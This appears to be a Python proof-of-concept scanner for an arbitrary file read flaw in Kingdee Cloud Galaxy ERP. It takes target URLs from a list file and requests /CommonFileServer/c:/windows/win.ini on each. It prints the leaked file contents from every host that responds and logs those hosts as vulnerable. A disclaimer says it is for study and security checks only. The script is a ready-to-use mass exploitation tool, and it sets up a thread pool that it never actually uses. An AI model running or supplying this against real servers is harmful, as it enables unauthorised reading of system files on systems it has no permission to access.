import requests
from concurrent.futures import ThreadPoolExecutor
import time
import argparse

def title():
    print("")
    print("")
    print('+------------------------------------------------------------')
    print('金蝶云星空任意文件读取漏洞检测')
    print("仅限学习使用或安全排查使用，请勿用于非法测试！")
    print('使用方式：python jdyxk.py')
    print('+------------------------------------------------------------')
    print("")
def poc(url):
    # 存储状态码为200的URL的列表
    successful_urls = []
    headers= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
    }
    # 无视证书不报错
    requests.packages.urllib3.disable_warnings()
    try:
        req=requests.get(url+"/CommonFileServer/c:/windows/win.ini",headers=headers,timeout=10,verify=False)
        if req.status_code ==200:
            print(url+"存在漏洞，返回内容如下：")
            print(req.text.encode("iso-8859-1").decode("utf-8"))
            successful_urls.append(url+"存在漏洞，返回内容如下：\n"+req.text.encode("iso-8859-1").decode("utf-8"))
            # 将状态码为200的URL写入文本文件
            with open("successful_urls.txt",  "a") as file:
              for url in successful_urls:
                file.write(url + "\n")
        else:
            print(url+"不存在漏洞\n")
    except Exception as e:
        print(f"访问 {url} 失败\n")

if __name__ == '__main__':
    title()
    # 清除之前保存记录
    with open("successful_urls.txt",  "w") as file:
        pass
    urls = []
    with open("url.txt", "r") as f:
        for line in f:
            urls.append(line.strip())
    executor = ThreadPoolExecutor(max_workers=10)
    for url in urls:
        poc(url)
    print('+------------------------------------------------------------')
    print("漏洞检测完毕，请打开successful_urls.txt查看漏洞内容。")
    print('+------------------------------------------------------------')
    # 等待所有线程执行完毕
    executor.shutdown(wait=True)
    